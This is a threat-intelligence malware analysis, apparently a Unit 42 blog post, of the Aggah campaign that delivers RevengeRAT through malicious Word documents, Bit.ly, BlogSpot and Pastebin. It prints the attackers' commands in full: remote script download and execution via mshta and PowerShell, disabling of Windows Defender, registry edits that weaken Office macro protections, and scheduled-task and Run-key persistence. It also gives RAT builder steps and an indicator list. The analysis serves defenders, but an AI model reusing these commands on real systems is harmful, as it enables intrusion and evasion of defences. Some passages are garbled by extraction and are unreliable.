4/22/2019Aggah Campaign: Bit.ly, BlogSpot, and Pastebin Used for C2 in Large Scale CampaignAggah Campaign: Bit.ly, BlogSpot, and Pastebin Used for C2 in Large Scale Campaignunit42.paloaltonetworks.com/aggah-campaign-bit-ly-blogspot-and-pastebin-used-for-c2-in-large-scale-campaignBy Robert Falcone and Brittany Ash Executive Summary In March 2019, Unit 42 began looking into an attack campaign that appeared to be primarily focused on organizations within a Middle Eastern country. Further analysis revealed that this activity is likely part of a much larger campaign impacting not only that region but also the United States, and throughout Europe and Asia.April 17, 2019Our analysis of the delivery document revealed it was built to load a malicious macro-enabled document from a remote server via Template Injection. These macros use BlogSpot posts to obtain a script that uses multiple Pastebin pastes to download additional scripts, which ultimately result in the ﬁnal payload being RevengeRAT conﬁgured with a duckdns[.]org domain for C2. During our research, we found several related delivery documents that followed the same process to ultimately install RevengeRAT hosted on Pastebin, which suggests the actors used these TTPs throughout their attack campaign. Initially, we believed this activity to be potentially associated with the Gorgon Group. Our hypothesis was based on the high level TTPs including the use of RevengeRAT. However, Unit 42 has not yet identiﬁed direct overlaps with other high-ﬁdelity Gorgon Group indicators. Based on this, we are not able to assign this activity to the Gorgon group with an appropriate level of certainty.In light of that, Unit 42 refers to the activity described in this blog as the Aggah Campaign based on the actor’s alias “hagga”, which was used to split data sent to the RevengeRAT C2 server and was the name of one of the Pastebin accounts used to host the RevengeRAT payloads. The Delivery Our research into the Aggah campaign began with a delivery document sent to organizations in a single Middle Eastern country via an email on March 27, 2019. This email appeared to originate from a large ﬁnancial institution in the same country, although it was likely spoofed. The subject of the email was “Your account is locked.” This initial delivery document was sent to organizations in one Middle Eastern country, speciﬁcally to organizations in the education, media/marketing, and government verticals. Four days later on March 31, we saw the same delivery email sent to a ﬁnancial organization in a second Middle Eastern country. We later discovered that this delivery document was just one of many in a larger campaign sent to organizations in the United States, Europe and Asia targeting the same verticals as in the Middle East as well as Technology, Retail, Manufacturing, State/Local Government, Hospitality, Medical, Technology, and other Professional business. The related documents were functionally similar, so we will describe the original sample we analyzed. The email sent on March 27 had a Word document attached with the ﬁlename “Activity.doc” (SHA256: “Activity.doc” is opened, it displays the image in Figure 1 as a lure in an attempt to trick the user into enabling content to allow macros to run. The lure suggests that the user must open the document in the desktop versions of Microsoft Word, as macros do not function in the online version of Word in Ofﬁce 365.The “Activity.doc” ﬁle does not contain a macro, but the OLE document that it loads from the remote server does contain a macro.Figure 1. Lure image used in Activity.doc to trick user into enabling macros Activity.doc Analysis The delivery document uses Template Injection to load a ﬁle hosted on a remote server. Figure 2 shows the contents of the delivery document’s footer that attempts to signiﬁcant amount of ‘junk’ code. The purpose of this macro is to decode and execute the following URL via the “Shell” command: mshta hxxp://www.bitly[.]com/SmexEaldos3The command above uses the built-in “mshta” application to download the contents of URL provided, in this case a shortened URL using the Bit.ly service. During WildFire’s analysis, the shortened bit.ly URL redirected to hxxps://bjm9.blogspot[.]com/p/si.html, as seen in the “Location” ﬁeld of the HTTP response in Figure 3.Figure 3. Bit.ly shortened link pointing to blog hosted at BlogspotAs you can see in the GET request above, the redirect points the browser (“mshta.exe” in this case) to a blog hosted on blogspot[.]com. As you can see in Figure 4, this BlogSpot article appears a bit odd but not necessarily malicious.Figure 4. bjm9.blogspot[.]com screen captureBy analyzing the code hosted on the blog, we discovered it actually includes a JavaScript embedded within it that performs several activities. Figure 5 shows the malicious JavaScript hosted at the seemingly innocuous blog.url Campaign: Bit.ly, BlogSpot, and Pastebin Used for C2 in Large Scale CampaignFigure 5. Script embedded in bjm9 Blogspot article The malicious script carries out several activities on the compromised system. First, it attempts to hamper Microsoft Defender by removing its signature set. The script also kills the Defender process along with the processes for several Ofﬁce applications. All of this is performed using the following command line:cmd.exe /c cd “”%ProgramFiles%\Windows Defender”” & MpCmdRun.exe -removedeﬁnitions -dynamicsignatures & taskkill /f /im winword.exe & taskkill /f /im excel.exe & taskkill /f /im MSPUB.exe & taskkill /f /im POWERPNT.EXE & forﬁles /c “”taskkill /f /im MSASCuiL.exe”” & forﬁles /c “”taskkill /f /im MpCmdRun.exe”” & exitThe script then attempts to disable security mechanisms within Ofﬁce products, speciﬁcally by setting registry key values to enable macros and to disable ProtectedView. First, the script enables macros within Word, PowerPoint and Excel by setting the following registry keys to a value of “1”: HKCU\Software\Microsoft\Ofﬁce\11.0\Word\Security\VBAWarningsHKCU\Software\Microsoft\Ofﬁce\12.0\Word\Security\VBAWarningsHKCU\Software\Microsoft\Ofﬁce\14.0\Word\Security\VBAWarnings HKCU\Software\Microsoft\Ofﬁce\15.0\Word\Security\VBAWarningsHKCU\Software\Microsoft\Ofﬁce\16.0\Word\Security\VBAWarningsHKCU\Software\Microsoft\Ofﬁce\11.0\PowerPoint\Security\VBAWarnings HKCU\Software\Microsoft\Ofﬁce\12.0\PowerPoint\Security\VBAWarningsHKCU\Software\Microsoft\Ofﬁce\14.0\PowerPoint\Security\VBAWarningsHKCU\Software\Microsoft\Ofﬁce\15.0\PowerPoint\Security\VBAWarnings HKCU\Software\Microsoft\Ofﬁce\16.0\PowerPoint\Security\VBAWarningsHKCU\Software\Microsoft\Ofﬁce\11.0\Excel\Security\VBAWarnings HKCU\Software\Microsoft\Ofﬁce\12.0\Excel\Security\VBAWarningsHKCU\Software\Microsoft\Ofﬁce\14.0\Excel\Security\VBAWarningsHKCU\Software\Microsoft\Ofﬁce\15.0\Excel\Security\VBAWarnings HKCU\Software\Microsoft\Ofﬁce\16.0\Excel\Security\VBAWarningsThe script then attempts to disable the ProtectedView security mechanism within Word, PowerPoint and Excel by setting the following registry keys to a value of “1”:HKCU\Software\Microsoft\Ofﬁce\11.0\Word\Security\ProtectedView\DisableInternetFilesInPV HKCU\Software\Microsoft\Ofﬁce\11.0\Word\Security\ProtectedView\DisableAttachementsInPVHKCU\Software\Microsoft\Ofﬁce\11.0\Word\Security\ProtectedView\DisableUnsafeLocationsInPVHKCU\Software\Microsoft\Ofﬁce\11.0\PowerPoint\Security\ProtectedView\DisableInternetFilesInPV HKCU\Software\Microsoft\Ofﬁce\11.0\PowerPoint\Security\ProtectedView\DisableAttachementsInPVHKCU\Software\Microsoft\Ofﬁce\11.0\PowerPoint\Security\ProtectedView\DisableUnsafeLocationsInPVHKCU\Software\Microsoft\Ofﬁce\11.0\Excel\Security\ProtectedView\DisableInternetFilesInPV HKCU\Software\Microsoft\Ofﬁce\11.0\Excel\Security\ProtectedView\DisableAttachementsInPVHKCU\Software\Microsoft\Ofﬁce\11.0\Excel\Security\ProtectedView\DisableUnsafeLocationsInPVHKCU\Software\Microsoft\Ofﬁce\12.0\Word\Security\ProtectedView\DisableInternetFilesInPV HKCU\Software\Microsoft\Ofﬁce\12.0\Word\Security\ProtectedView\DisableAttachementsInPVHKCU\Software\Microsoft\Ofﬁce\12.0\Word\Security\ProtectedView\DisableUnsafeLocationsInPVHKCU\Software\Microsoft\Ofﬁce\12.0\PowerPoint\Security\ProtectedView\DisableInternetFilesInPVurl Campaign: Bit.ly, BlogSpot, and Pastebin Used for C2 in Large Scale CampaignHKCU\Software\Microsoft\Ofﬁce\12.0\PowerPoint\Security\ProtectedView\DisableAttachementsInPVHKCU\Software\Microsoft\Ofﬁce\12.0\PowerPoint\Security\ProtectedView\DisableUnsafeLocationsInPV HKCU\Software\Microsoft\Ofﬁce\12.0\Excel\Security\ProtectedView\DisableInternetFilesInPVHKCU\Software\Microsoft\Ofﬁce\12.0\Excel\Security\ProtectedView\DisableAttachementsInPVHKCU\Software\Microsoft\Ofﬁce\12.0\Excel\Security\ProtectedView\DisableUnsafeLocationsInPV HKCU\Software\Microsoft\Ofﬁce\14.0\Word\Security\ProtectedView\DisableInternetFilesInPVHKCU\Software\Microsoft\Ofﬁce\14.0\Word\Security\ProtectedView\DisableAttachementsInPVHKCU\Software\Microsoft\Ofﬁce\14.0\Word\Security\ProtectedView\DisableUnsafeLocationsInPV HKCU\Software\Microsoft\Ofﬁce\14.0\PowerPoint\Security\ProtectedView\DisableInternetFilesInPVHKCU\Software\Microsoft\Ofﬁce\14.0\PowerPoint\Security\ProtectedView\DisableAttachementsInPVHKCU\Software\Microsoft\Ofﬁce\14.0\PowerPoint\Security\ProtectedView\DisableUnsafeLocationsInPV HKCU\Software\Microsoft\Ofﬁce\14.0\Excel\Security\ProtectedView\DisableInternetFilesInPVHKCU\Software\Microsoft\Ofﬁce\14.0\Excel\Security\ProtectedView\DisableAttachementsInPVHKCU\Software\Microsoft\Ofﬁce\14.0\Excel\Security\ProtectedView\DisableUnsafeLocationsInPV HKCU\Software\Microsoft\Ofﬁce\15.0\Word\Security\ProtectedView\DisableInternetFilesInPVHKCU\Software\Microsoft\Ofﬁce\15.0\Word\Security\ProtectedView\DisableAttachementsInPVHKCU\Software\Microsoft\Ofﬁce\15.0\Word\Security\ProtectedView\DisableUnsafeLocationsInPV HKCU\Software\Microsoft\Ofﬁce\15.0\PowerPoint\Security\ProtectedView\DisableInternetFilesInPVHKCU\Software\Microsoft\Ofﬁce\15.0\PowerPoint\Security\ProtectedView\DisableAttachementsInPV HKCU\Software\Microsoft\Ofﬁce\15.0\PowerPoint\Security\ProtectedView\DisableUnsafeLocationsInPVHKCU\Software\Microsoft\Ofﬁce\15.0\Excel\Security\ProtectedView\DisableInternetFilesInPVHKCU\Software\Microsoft\Ofﬁce\15.0\Excel\Security\ProtectedView\DisableAttachementsInPV HKCU\Software\Microsoft\Ofﬁce\15.0\Excel\Security\ProtectedView\DisableUnsafeLocationsInPVHKCU\Software\Microsoft\Ofﬁce\16.0\Word\Security\ProtectedView\DisableInternetFilesInPVHKCU\Software\Microsoft\Ofﬁce\16.0\Word\Security\ProtectedView\DisableAttachementsInPV HKCU\Software\Microsoft\Ofﬁce\16.0\Word\Security\ProtectedView\DisableUnsafeLocationsInPVHKCU\Software\Microsoft\Ofﬁce\16.0\PowerPoint\Security\ProtectedView\DisableInternetFilesInPVHKCU\Software\Microsoft\Ofﬁce\16.0\PowerPoint\Security\ProtectedView\DisableAttachementsInPV HKCU\Software\Microsoft\Ofﬁce\16.0\PowerPoint\Security\ProtectedView\DisableUnsafeLocationsInPVHKCU\Software\Microsoft\Ofﬁce\16.0\Excel\Security\ProtectedView\DisableInternetFilesInPVHKCU\Software\Microsoft\Ofﬁce\16.0\Excel\Security\ProtectedView\DisableAttachementsInPV HKCU\Software\Microsoft\Ofﬁce\16.0\Excel\Security\ProtectedView\DisableUnsafeLocationsInPVThe technique of enabling macros and disabling ProtectedView in Ofﬁce, including the order in which the registry keys were modiﬁed was also described in our blog covering the Gorgon group. Also, the tactic of killing processes for Windows Defender and Microsoft Ofﬁce applications was also carried out by Gorgon as well. The Gorgon group also used the bitly URL shortening service in their attacks, but while these are obvious technique overlaps, we still do not have concrete evidence that this attack campaign is associated with Gorgon.The script hosted on Blogspot then carries out three main activities that include:1. Downloading a payload from a Pastebin URL 2. Creating a scheduled task to periodically obtain and run a script from a Pastebin URL 3. Creating an autorun registry key to obtain and run a script from a Pastebin URLObtaining a payload from Pastebin The script hosted at Blogspot obtains a portable executable payload from a Pastebin URL and executes it. The script builds the following command and attempts to run it using the WScript.Shell object:url Campaign: Bit.ly, BlogSpot, and Pastebin Used for C2 in Large Scale Campaignmshta.exe vbscript:CreateObject(“”Wscript.Shell””).Run(“”powershell.exe -noexit -command [Reﬂection.Assembly]::Load([System.Convert]::FromBase64String((New- Object Net.WebClient).DownloadString(\’h\’+\’t\’+\’t\’+\’p\’+\’s:\’+\’//p\’+\’a\’+\’s\’+\’t\’+\’e\’+\’b\’+\’i\’+\’n\’+\’.\’+\’c\’+\’o\’+\’m\’+\’/\’+\’r\’+\’a\’+\’w\’+\’/\’+\’2LDaeHE1\’))).EntryPoint.Invoke($N,$ (window.close)The command above results in the downloading of a portable executable hosted on Pastebin at url decoding the base64 downloaded from the URL, and then executing it. Figure 6 shows the Pastebin page hosting the executable downloaded by the script.Figure 6. 2LDaeHE1 Pastebin pageThe decoded payload has the following attributes:SHA256 2019-03-20 19:43:08Table 2. Decoded payload from pastebin[.]com/raw/2LDaeHE1This payload was written in VB.NET and named “Nuclear Explosion,” which is a variant of RevengeRAT conﬁgured to use the domain “lulla.duckdns[.]org” for C2, as seen in Figure 7.Figure 7. RevengeRAT conﬁgurationAccording to its conﬁguration seen in Figure 8, when sending data to the C2 server, it will split the information using the string “hagga“, which is the same name as the PasteBin account hosting the payload information seen in Figure 6 and the basis of the Aggah campaign name.url Campaign: Bit.ly, BlogSpot, and Pastebin Used for C2 in Large Scale CampaignFigure 8. Conﬁguration showing the string “hagga” used to split information sent to the C2 server Creating a Scheduled Task The script hosted at the Blogspot blog builds another command to create a scheduled task called “eScan Backup” that runs every 100 minutes. The command string generated by the script used to create this scheduled task is:schtasks /create /sc MINUTE /mo 100 /tn eScan Backup /tr “”mshta vbscript:CreateObject(“”Wscript.Shell””).Run(“”mshta.exe url””,0,true)(window.close)”” /F ‘The “eScan Backup” task will use the built-in mshta application to download a script from a Pastebin URL, speciﬁcally at hxxps://pastebin[.]com/raw/tb5gHu2G that we will continue to refer to as the tb5gHu2G script. We believe the actors chose the name “eScan Backup” to appear related to the eScan antivirus products. Figure 9 shows the scheduled task in Windows’ Task Scheduler program.Figure 9. Scheduled task created to reach out to Pastebin URL and run the hosted script every 100 minutes The scheduled task downloading and running the tb5gHu2G script is meant for persistence, as it runs the same command to hamper Windows Defender and kill Ofﬁce applications. The tb5gHu2G script also attempts to run the same VBScript as the script hosted on the Blogspot blog, of which downloads and executes the payload from the “2LDaeHE1” Pastebin page shown in Figure 6. Figure 10 shows the Pastebin page hosting the tb5gHu2G script.url Campaign: Bit.ly, BlogSpot, and Pastebin Used for C2 in Large Scale CampaignFigure 10. tb5gHu2G Pastebin page Creating an Autorun Registry Key The script hosted at the Blogspot blog creates an autorun registry key, which appears to be a second persistence mechanism to supplement the previously mentioned scheduled task. To create the autorun key, the script generates the following command that it will attempt to run:CreateObject(“Wscript.Shell”).regwrite “HKCU\Software\Microsoft\Windows\CurrentVersion\Run\MicrosoftUpdate”, “C:\Windows\System32\mshta.exe vbscript:CreateObject(“”Wscript.Shell””).Run(“”mshta.exe%20url″”,0,true)(window.close)” , “REG_EXPAND_SZ” This run key will attempt to download the contents hosted at yet another Pastebin URL of url run the contents as a script using the Wscript.Shell object. Figure 11 shows the Pastebin page displaying the contents of the script.Figure 11. YYZq1XR0 Pastebin pageThe YYZq1XR0 Pastebin paste contains the following script that does very little:<script language=”VBScript”> self.closeurl Campaign: Bit.ly, BlogSpot, and Pastebin Used for C2 in Large Scale CampaignThe fact that the above script does so little suggests that the actor may update this paste with a new script containing additional functionality when desired. The editing of pastes is possible if the paste was created using a “Pro” account. These pastes were created by an account named HAGGA, which appears to be a PRO account that would allow the actor to update the script to run on infected systems. HAGGA has several additional pastes as well as seen below in Figure 12. These pastes contain additional malicious scripts that are ultimately used to create a payload.Figure 12. Hagga’s Pastebin page Part of a Larger Campaign? While investigating this particular campaign we reviewed the click count available on Bit.ly. As of April 11, 2019, the Bit.ly link, SmexEaldos3, referenced in the analysis above contained over 1,900 clicks in about 20 countries spanning North America, Europe, Asia, and the Middle East. This high volume click-count indicated to us that we were likely only looking at an extremely small subset of the actual campaign. It is also highly likely that these click counts also include individuals accessing the shortened link during investigations and research efforts; therefore, the number is not an accurate representation of the number of hosts infected.Figure 13. bitly SmexEaldos3 page clicksurl Campaign: Bit.ly, BlogSpot, and Pastebin Used for C2 in Large Scale CampaignDigging in a bit further we took a look at the document properties to see what additional information we may be able to use to help identify related activity. The document properties indicate these operators were using an apparently pirated version of Microsoft Word and used the string ‘Lulli moti myri’ as the creator/author of the document. Using this string we searched in our repositories and identiﬁed over a dozen Microsoft Ofﬁce documents – half of them DOCX and the other half XLS.All of the documents have a time stamp between January and April 2019, and each contained a Bit.ly URL that redirects to a Blogspot page. While all of these After reviewing all of the delivery documents and RevengeRAT payloads we discovered that all but one payload contains the mutex RV_MUTEX- WindowsUpdateSysten32 (note the purposeful misspelling by the attackers of “Systen32” for “System32”) with a base64 encoded identiﬁer of SE9URUlTIE5PVk9T that decodes to HOTEIS NOVOS (“NEW HOTELS” in Portuguese). We searched through our available repositories to see just how many samples contained these strings. We found over 50 ﬁles beginning as early as September 2018, which are noted in Appendix A. Many of these samples contained the same ‘hagga’ key; however, we also noted three other additional keys: ‘oldman’, ‘steve’, and ‘roma225’. The ‘roma225’ key was discussed in December 2018 in a publication titled ‘The Enigmatic “Roma225” Campaign’ by Yoroi. The one sample that was not conﬁgured with that mutex and identifer was the sample noted in Table 5. That sample contains the mutex RV_MUTEX-cuiGGjjtnxDpnF and the Identiﬁer TWlsZWdvbmE= which decodes to ‘Milegona’. Correlating RevengeRAT samples RevengeRAT is a commodity Trojan that has many leaked builders freely available in open source, which makes attributing the tool’s use to a speciﬁc actor or attack campaign difﬁcult. Because of this, we wanted to determine if the mutex, identiﬁer and key seen in Aggah related samples were not standard default values for RevengeRAT and if they were strong enough to use for pivoting and correlation purposes. To gauge the likelihood of two unrelated actors using the same values in the conﬁguration, we used the leaked RevengeRAT builder (v0.3) to visualize the process an actor would have to take to create RevengeRAT samples that shared the same mutex, identiﬁer and key as the payload delivered in the Aggah campaign.To our surprise, we found it was rather unlikely that two unrelated individuals would use the mutex, identiﬁer, and key just by happenstance. We believe this as the actor must manually enter the mutex, identiﬁer, and key into speciﬁc ﬁelds within the RevengeRAT builder, in which we will highlight in the following explanation of steps required to build the Trojan. To create the RevengeRAT payload used in this campaign, the actor would use the RevengeRAT server to compile an executable conﬁgured with the appropriate ﬁelds. First, the actor would set the “Socket Key” ﬁeld to “hagga” and press “Start Listening”, as seen in Figure 14.Figure 14. RevengeRAT Builder Socket Key SettingOnce the server is conﬁgured and listening, the actor would click the “Client Builder” button to create the RevengeRAT client, as seen in Figure 15.url Campaign: Bit.ly, BlogSpot, and Pastebin Used for C2 in Large Scale CampaignFigure 15. RevengeRAT Client Builder In the Client Builder, the actor would click the “Network Settings” drop down and enter the domain “lulla.duckdns[.]org” and the TCP port of 2336 before pressing the add button seen in Figure 16.Figure 16. RevengeRAT Network Settings setup The actor would then click the Basic Settings drop down and enter their chosen identiﬁer “HOTEIS NOVOS” into the “Client Identiﬁer” ﬁeld and would add “- WindowsUpdateSysten32” in the “Client Mutex” ﬁeld, as it already contains “RV_MUTEX” by default. Figure 17 shows these values added to the correct ﬁelds. What is of interest to note here is that the actor manually added the string “-WindowsUpdateSysten32” instead of clicking the plus (“+”) button available next to this ﬁeld, which would concatenate a hyphen and a random string instead.url Campaign: Bit.ly, BlogSpot, and Pastebin Used for C2 in Large Scale CampaignFigure 17. RevengeRAT Basic Settings setup Lastly, to compile the payload the actor has to agree to the Terms of Service and click the “Compile” button, as seen in Figure 18.Figure 18. RevengeRAT Ready to compile By pressing the compile button, the RevengeRAT server will create a client executable with a default name of “Client.exe” that the actor can save to the system prior to delivering it in their attack. Figure 19 shows the RevengeRAT client icon on the desktop.Figure 19. RevengeRAT Client IconThe conﬁguration within the compiled “Client.exe” seen in Figures 16 and 17 visually matches the conﬁguration of the RevengeRAT downloaded from Pastebin in the Aggah campaign, as seen in Figures 7 and 8. This suggests that the actor(s) involved in this campaign would have followed similar steps to create their payload. The sequence of steps carried out to create RevengeRAT payloads that share the same client identiﬁers and socket keys suggests with a high conﬁdence that a common actor is involved.Conclusion Initially, according to our telemetry it appeared as though this could be a very focused effort to target organizations within one Middle Eastern country. However, after further analysis this appears to be just a small part of a much larger campaign which also seems to be affecting many regions including but not limited to the United States, Europe, and Asia. Unfortunately, our current data set does not afford insight into the attackers’ motivation other than to compromise a large number of victims.While a lot of this activity behaviorally appears to be potentially related to the Gorgon Group’s criminal activity, it is currently unclear and requires additional analysis to prove. Both Unit 42 and Yoroi recently released similar blogs which also displayed similar tactics but were not assessed with a high level of conﬁdence as related to the Gorgon Group. Although we are unsure of a connection to the Gorgon Group speciﬁcally, we do assess that based on the unique conﬁguration of these RevengeRATurl Campaign: Bit.ly, BlogSpot, and Pastebin Used for C2 in Large Scale Campaignsamples that a common operator was likely involved in the activity mentioned in this blog.RevengeRAT is a publicly available RAT which is seen in high volume. It appears as though some users of this RAT have moved from following publicly available step- by-step guides to become a little more sophisticated in how they are leveraging alternative storage locations for C2 support, such as Pastebin. These technique changes may help the operators by hiding behind legitimate services that are likely not blocked by security devices. Palo Alto Networks customers are protected from these operators in the following ways:AutoFocus: Customers can currently track this campaign activity using the following tags: Aggah, RevengeRAT WildFire and Traps: detects all malware supported in this report as maliciousPalo Alto Networks has shared our ﬁndings, including ﬁle samples and indicators of compromise, in this report with our fellow Cyber Threat Alliance members. CTA members use this intelligence to rapidly deploy protections to their customers and to systematically disrupt malicious cyber actors. For more information on the Cyber Threat Alliance, visit www.cyberthreatalliance.org. Appendix A:Indicators of Compromise Malicious Documents and Payloads Download URLswww.bitly[.]com/nliasjdASd1 www.bitly[.]com/nliasjdASd2www.bitly[.]com/nliasjdASd3www.bitly[.]com/nliasjdASd4 www.bitly[.]com/nliasjdASd5www.bitly[.]com/nliasjdASd6www.bitly[.]com/nliasjdASd7 www.bitly[.]com/nliasjdASd8www.bitly[.]com/nliasjdASd9www.bitly[.]com/nliasjdASd11 www.bitly[.]com/nliasjdASd12www.bitly[.]com/nliasjdASd13www.bitly[.]com/SexoPhone1 www.bitly[.]com/SexoPhone2www.bitly[.]com/SexoPhone4 www.bitly[.]com/SmexEaldos1www.bitly[.]com/SmexEaldos2www.bitly[.]com/SmexEaldos3 url www.bitly[.]com/SmexEaldos7www.bitly[.]com/SmexEaldos8www.bitly[.]com/SmexEaldos9 www.bitly[.]com/SmexEaldos10www.bitly[.]com/XAMSeWaWzwww.bitly[.]com/CAEanwQA www.bitly[.]com/MinPoXAsUKxwww.bitly[.]com/MinPoXAshttp:/bitly[.]com/chutter1 www.bitly[.]com/doc201901000791www.bitly[.]com/doc201901000793www.bitly[.]com/ASDAWnZqWas urlﬁctesgn.blogspot[.]com url Campaign: Bit.ly, BlogSpot, and Pastebin Used for C2 in Large Scale Campaignurl url The following indicators were identiﬁed associated with RevengeRAT, however, may not be exclusive to RevengeRATfrankmana.duckdns[.]orgworkﬁne11.duckdns[.]org oldmandnsch.duckdns[.]orgoldmandnsch.duckdns[.]orgblackhagga.duckdns[.]org skyrocket1.duckdns[.]orgskyrocket1.duckdns[.]orgkronoz.duckdns[.]org oldmandnsch.duckdns[.]orgkronozzz2.duckdns[.]orglulla.duckdns[.]org decent.myvnc[.]comdecent5.myvnc[.]com jayztools1.ddns[.]netjayztools2.ddns[.]netjayztools3.ddns[.]net totallol.duckdns[.]orgtotallol1.duckdns[.]orgtotallol2.duckdns[.]org totallol3.duckdns[.]orgdecent2.myvnc[.]comdecent3.myvnc[.]com decent1.myvnc[.]comdecent4.myvnc[.]comjordanchen736.sytes[.]net jordanchen7361.sytes[.]netjordanchen7362.sytes[.]netjordanchen7363.sytes[.]net lalacious1.serveftp[.]comlalacious2.serveftp[.]comlalacious3.serveftp[.]com lalacious4.serveftp[.]commastermana1.serveirc[.]commastermana2.serveirc[.]com mastermana3.serveirc[.]commastermana4.serveirc[.]comurl Campaign: Bit.ly, BlogSpot, and Pastebin Used for C2 in Large Scale Campaignmastermana5.serveirc[.]comlullikhao.ddns[.]net lullikhao1.ddns[.]netlullikhao2.ddns[.]netbullol.duckdns[.]org cocomo.ddns[.]nethaggasinger2.ddns[.]nethaggasinger.ddns[.]net haggasinger1.ddns[.]netloramer1.ddnsking[.]comeasykill.servebeer[.]com easykill3.servebeer[.]comeasykill2.servepics[.]comeasykill1.servepics[.]com easykill3.servepics[.]comhelloweenhagga.ddns[.]nethelloweenhagga3.ddns[.]net helloweenhagga4.ddns[.]nethelloweenhagga2.ddns[.]net revengerx211.sytes[.]netrevengerx212.sytes[.]netrevengerx213.sytes[.]net revengerx214.sytes[.]netrevengerx215.sytes[.]netrevengerx216.sytes[.]net revengerx217.sytes[.]netrevengerx218.sytes[.]netrevengerx219.sytes[.]net revengerx210.sytes[.]netofﬁce365update.duckdns[.]orgsysten32.ddns[.]net bhenchood.ddns[.]netemmanuelstevo.ddns[.]netzinderhola1.ddns[.]net zinderhola.ddns[.]netmyownlogs.duckdns[.]orgcocomo1.ddns[.]net cocomo10.serveblog[.]netcocomo2.ddns[.]netcocomo2.serveblog[.]net cocomo3.serveblog[.]netcocomo4.serveblog[.]neturl Campaign: Bit.ly, BlogSpot, and Pastebin Used for C2 in Large Scale Campaigncocomo5.serveblog[.]netcocomo6.serveblog[.]net cocomo7.serveblog[.]netcocomo8.serveblog[.]netcocomo9.serveblog[.]net mrcode.hopto[.]orgmrcode1.hopto[.]orgmrcode2.hopto[.]org pussi2442.ddns[.]neturl 